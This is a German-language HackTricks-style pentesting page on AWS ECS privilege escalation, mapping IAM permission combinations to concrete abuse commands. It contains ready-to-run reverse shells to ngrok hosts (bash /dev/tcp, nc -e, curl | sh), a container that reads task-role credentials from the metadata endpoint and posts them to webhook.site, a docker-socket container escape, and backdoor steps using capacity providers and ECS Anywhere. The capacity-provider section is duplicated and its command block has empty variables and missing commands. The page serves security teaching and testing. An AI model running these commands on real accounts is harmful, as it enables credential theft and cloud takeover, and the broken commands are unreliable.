# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

Mehr **Informationen zu ECS** in:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Ein Angreifer, der die Berechtigung `iam:PassRole`, `ecs:RegisterTaskDefinition` und `ecs:RunTask` in ECS missbraucht, kann **eine neue Task-Definition erstellen** mit einem **bösartigen Container**, der die Metadaten-Anmeldeinformationen stiehlt, und **diese ausführen**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

Erstelle einen webhook bei einem Dienst wie webhook.site
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Direktes privesc zu einer anderen ECS-Rolle.

### `iam:PassRole`,`ecs:RunTask`
Ein attacker, der über die Berechtigungen `iam:PassRole` und `ecs:RunTask` verfügt, kann eine neue ECS-Task starten und dabei die **execution role**, **task role** und den **command**-Wert des Containers ändern. Der `ecs run-task` CLI-Befehl enthält die Option `--overrides`, mit der zur Laufzeit `executionRoleArn`, `taskRoleArn` und das `command` des Containers geändert werden können, ohne die Task Definition anzufassen.

Die angegebenen IAM-Rollen für `taskRoleArn` und `executionRoleArn` müssen in ihrer Trust-Policy zulassen bzw. darauf vertrauen, dass sie von `ecs-tasks.amazonaws.com` übernommen (assumed) werden.

Außerdem muss der attacker wissen:
- ECS-Cluster-Name
- VPC Subnetz
- Security Group (Wenn keine Security Group angegeben ist, wird die Standard-Security Group verwendet)
- Task Definition Name und Revision
- Name des Containers
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Im obigen Code-Snippet überschreibt ein attacker nur den Wert `taskRoleArn`. Der attacker muss jedoch die Berechtigung `iam:PassRole` sowohl für die in dem Befehl angegebene `taskRoleArn` als auch für die in der Task-Definition angegebene `executionRoleArn` besitzen, damit der Angriff möglich ist.

Wenn die IAM-Rolle, die der attacker übergeben kann, genügend Rechte hat, um ein Image aus ECR zu ziehen und die ECS-Task zu starten (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`), dann kann der attacker dieselbe IAM-Rolle sowohl für `executionRoleArn` als auch für `taskRoleArn` im `ecs run-task`-Befehl angeben.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potentielle Auswirkungen:** Direkter privesc auf jede ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Wie im vorherigen Beispiel kann ein Angreifer, der die Berechtigungen **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** in ECS missbraucht, **eine neue Task-Definition erzeugen** mit einem **bösartigen Container**, der die Metadaten-Anmeldeinformationen stiehlt, und **diesen ausführen**.\
In diesem Fall wird jedoch eine Container-Instanz benötigt, um die bösartige Task-Definition auszuführen.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potentielle Auswirkung:** Direkter privesc auf jede ECS-Rolle.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

Wie im vorherigen Beispiel kann ein Angreifer, der die Berechtigungen **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** oder **`ecs:CreateService`** in ECS ausnutzt, **eine neue Task-Definition erstellen** mit einem **bösartigen Container**, der die Metadaten-Anmeldeinformationen stiehlt, und diesen ausführen, indem er einen neuen Service mit mindestens 1 laufendem Task erstellt.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Mögliche Auswirkungen:** Direkter privesc auf jede ECS-Rolle.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`)

Tatsächlich ist es mit genau diesen Berechtigungen möglich, overrides zu verwenden, um beliebige Befehle in einem Container mit einer beliebigen Rolle auszuführen, etwa so:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Mögliche Auswirkungen:** Direkter privesc auf jede ECS role.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Dieses Szenario ähnelt den vorherigen, jedoch **ohne** die **`iam:PassRole`** Berechtigung.\
Das ist weiterhin interessant, denn wenn du einen beliebigen Container ausführen kannst, selbst ohne role, könntest du **run a privileged container to escape** und **steal the EC2 IAM role** sowie die **other ECS containers roles**, die auf dem Node laufen.\
Du könntest sogar **force other tasks to run inside the EC2 instance** kompromittieren, um deren Anmeldeinformationen zu stehlen (wie in der [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node) besprochen).

> [!WARNING]
> Dieser Angriff ist nur möglich, wenn der **ECS cluster is using EC2** instances und nicht Fargate.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Ein Angreifer mit den **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** kann **Befehle in einem laufenden Container ausführen** und die daran angehängte IAM role exfiltrieren (man braucht die describe-Berechtigungen, da diese notwendig sind, um `aws ecs execute-command` auszuführen).\
Allerdings muss dafür die container instance den **ExecuteCommand agent** ausführen (was standardmäßig nicht der Fall ist).

Therefore, the attacker could try to:

- **Versuchen, in jedem laufenden Container einen Befehl auszuführen**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Wenn er **`ecs:RunTask`** hat, führe einen Task aus mit `aws ecs run-task --enable-execute-command [...]`
- Wenn er **`ecs:StartTask`** hat, führe einen Task aus mit `aws ecs start-task --enable-execute-command [...]`
- Wenn er **`ecs:CreateService`** hat, erstelle einen Service mit `aws ecs create-service --enable-execute-command [...]`
- Wenn er **`ecs:UpdateService`** hat, aktualisiere einen Service mit `aws ecs update-service --enable-execute-command [...]`

Du findest **Beispiele für diese Optionen** in **vorherigen ECS privesc Abschnitten**.

**Mögliche Auswirkungen:** Privesc zu einer anderen Rolle, die an Container angehängt ist.

### `ssm:StartSession`

Sieh auf der **ssm privesc page** nach, wie du diese Berechtigung missbrauchen kannst, um **privesc zu ECS**:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Sieh auf der **ec2 privesc page** nach, wie du diese Berechtigungen missbrauchen kannst, um **privesc zu ECS**:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen könnte potenziell eine EC2-Instanz in einem ECS-Cluster registrieren und darauf Tasks ausführen. Dadurch könnte der Angreifer beliebigen Code im Kontext der ECS-Tasks ausführen.

- TODO: Ist es möglich, eine Instanz aus einem anderen AWS-Konto zu registrieren, sodass Tasks auf Maschinen ausgeführt werden, die vom Angreifer kontrolliert werden??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Test this

Ein Angreifer mit den Berechtigungen `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet` und `ecs:DescribeTaskSets` kann **einen bösartigen Task-Set für einen bestehenden ECS-Service erstellen und das primäre Task-Set aktualisieren**. Dadurch kann der Angreifer **beliebigen Code innerhalb des Service ausführen**.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Potentielle Auswirkungen**: Beliebigen Code im betroffenen Service ausführen, wodurch dessen Funktionalität beeinträchtigt werden oder sensible Daten exfiltriert werden können.

## Referenzen

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{{#include ../../../../banners/hacktricks-training.md}}





### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ein Angreifer mit Berechtigungen, ECS capacity providers zu verwalten und Services zu aktualisieren, kann eine von ihm kontrollierte EC2 Auto Scaling Group erstellen, diese in einen ECS Capacity Provider einbinden, ihn mit dem Ziel-Cluster verknüpfen und einen Opfer-Service so migrieren, dass er diesen Provider verwendet. Tasks werden dann auf von Angreifern kontrollierten EC2-Instanzen geplant, wodurch OS‑Level-Zugriff möglich wird, um Container zu untersuchen und Task-Role-Credentials zu stehlen.

Commands (us-east-1):

- Voraussetzungen



- Launch Template erstellen, damit sich der ECS agent dem Ziel-Cluster anschließt



- Auto Scaling Group erstellen



- Capacity Provider aus der ASG erstellen



- Den Capacity Provider mit dem Cluster verknüpfen (optional als Standard)



- Einen Service auf Ihren Provider migrieren



- Überprüfen, dass Tasks auf Angreifer-Instanzen landen



- Optional: Vom EC2-Knoten aus docker exec in Ziel-Container und http://169.254.170.2 lesen, um die Task-Role-Credentials zu erhalten.

- Aufräumen



**Potentielle Auswirkungen:** Von Angreifer kontrollierte EC2-Knoten erhalten Opfer-Tasks, was OS‑Level-Zugriff auf Container ermöglicht und zum Diebstahl der Task-IAM-Rollen-Credentials führen kann.


<details>
<summary>Schritt-für-Schritt Befehle (kopieren/einfügen)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

ECS Anywhere missbrauchen, um einen vom Angreifer kontrollierten Host als EXTERNAL container instance in einem Opfer-ECS-Cluster zu registrieren und Tasks auf diesem Host mit privilegierten task- und execution-roles auszuführen. Dies verschafft OS‑Level-Kontrolle darüber, wo Tasks laufen (dem eigenen Rechner) und ermöglicht das Stehlen von Credentials/Daten aus Tasks und angehängten Volumes, ohne Capacity Providers oder ASGs anzufassen.

- Erforderliche Berechtigungen (Beispiel minimal):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (for the ECS Anywhere instance role and task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (if using awslogs)

- Auswirkung: Beliebige Container mit ausgewähltem taskRoleArn auf dem Angreifer-Host ausführen; Task-Role-Credentials von 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI exfiltrieren; auf alle von Tasks eingehängten Volumes zugreifen; unauffälliger als das Manipulieren von Capacity Providers/ASGs.

Schritte

1) Cluster erstellen/identifizieren (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) ECS Anywhere-Rolle erstellen und SSM-Aktivierung (für on-prem/EXTERNAL Instanz)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Angreifer-Host provisionieren und automatisch als EXTERNAL registrieren (Beispiel: kleine AL2 EC2 als “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) Überprüfen, ob die EXTERNAL Container-Instance beigetreten ist
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) Erstelle task/execution roles, registriere die EXTERNAL task definition und führe sie auf dem attacker host aus
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Ab hier kontrollierst du den Host, der die Tasks ausführt. Du kannst task logs (wenn awslogs) lesen oder direkt auf dem Host per exec zugreifen, um credentials/data aus deinen Tasks zu exfiltrate.



#### Befehlsbeispiel (Platzhalter)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ein Angreifer mit Berechtigungen, ECS capacity providers zu verwalten und Services zu aktualisieren, kann eine EC2 Auto Scaling Group unter seiner Kontrolle erstellen, diese in einen ECS Capacity Provider einbinden, ihn dem Ziel-Cluster zuordnen und einen Opfer-Service so migrieren, dass er diesen Provider verwendet. Die Tasks werden dann auf vom Angreifer kontrollierten EC2-Instanzen geplant, was OS-Level-Zugriff erlaubt, um Container zu inspizieren und task role credentials zu stehlen.

Befehle (us-east-1):

- Voraussetzungen



- Launch Template erstellen, damit der ECS agent dem Zielcluster beitritt



- Auto Scaling Group erstellen



- Capacity Provider aus der ASG erstellen



- Den Capacity Provider dem Cluster zuordnen (optional als Default)



- Einen Service auf deinen Provider migrieren



- Prüfen, ob Tasks auf den Instanzen des Angreifers landen



- Optional: Vom EC2-Node aus per docker exec in Ziel-Container einsteigen und http://169.254.170.2 lesen, um die task role credentials zu erhalten.

- Aufräumen



**Potential Impact:** Vom Angreifer kontrollierte EC2-Knoten erhalten die Tasks der Opfer, wodurch OS-Level-Zugriff auf Container möglich wird und task IAM role credentials gestohlen werden können.
